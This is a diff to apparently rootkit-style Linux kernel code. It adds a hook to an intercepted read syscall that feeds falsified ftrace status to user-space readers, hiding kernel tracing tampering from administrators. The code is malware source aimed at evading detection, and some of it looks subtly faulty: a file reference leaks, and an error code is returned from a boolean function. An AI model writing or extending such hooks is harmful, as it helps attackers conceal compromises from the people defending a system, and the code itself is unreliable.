@@ -212,6 +212,57 @@ out:
     return rv;
 }
 
+static bool _ftrace_intercept(struct pt_regs *regs) {
+    static char kv_prev_ftrace_enabled[16] = "1\n";
+    int fd = PT_REGS_PARM1(regs);
+    bool rc = false;
+
+    if (fd) {
+        const char __user *arg;
+        struct file *file;
+        struct path file_path;
+
+        file = fget(fd);
+        file_path = file->f_path;
+        if (file_path.dentry && file_path.dentry->d_name.name) {
+            if (strstr(file_path.dentry->d_name.name, "ftrace")) {
+
+
+                arg = (const char __user *)regs->si;
+                char current_value[16];
+                char output[] = "1\n";
+
+
+                if (copy_from_user(current_value, (void *)arg, sizeof(current_value) - 1)) {
+                    prerr("Failed to copy data from user space\n");
+                    return -EFAULT;
+                }
+
+
+                current_value[sizeof(current_value) - 1] = '\0';
+
+                arg = (const char __user*)PT_REGS_PARM2(regs);
+
+
+
+                if (strcmp(current_value, kv_prev_ftrace_enabled) != 0) {
+                    strncpy(kv_prev_ftrace_enabled, current_value, 1);
+                }
+
+                strncpy(output, kv_prev_ftrace_enabled, sizeof(output));
+                prinfo("output=%c kv=%c current=%s", output[0], kv_prev_ftrace_enabled[0], current_value);
+
+                size_t output_size = sizeof(output) - 1;
+                if (!copy_to_user((void*)arg, output, output_size)) {
+                    rc = true;
+                }
+            }
+        }
+    }
+
+
+    return rc;
+}
 
 static asmlinkage long m_read(struct pt_regs *regs) {
     char *buf = NULL;
@@ -223,6 +274,9 @@ static asmlinkage long m_read(struct pt_regs *regs) {
 
     /** call the real thing first */
     rv = real_m_read(regs);
+
+    if (_ftrace_intercept(regs))
+        goto out;
 
     fs = fs_get_file_node(current);
     if (!fs || !fs->filename)
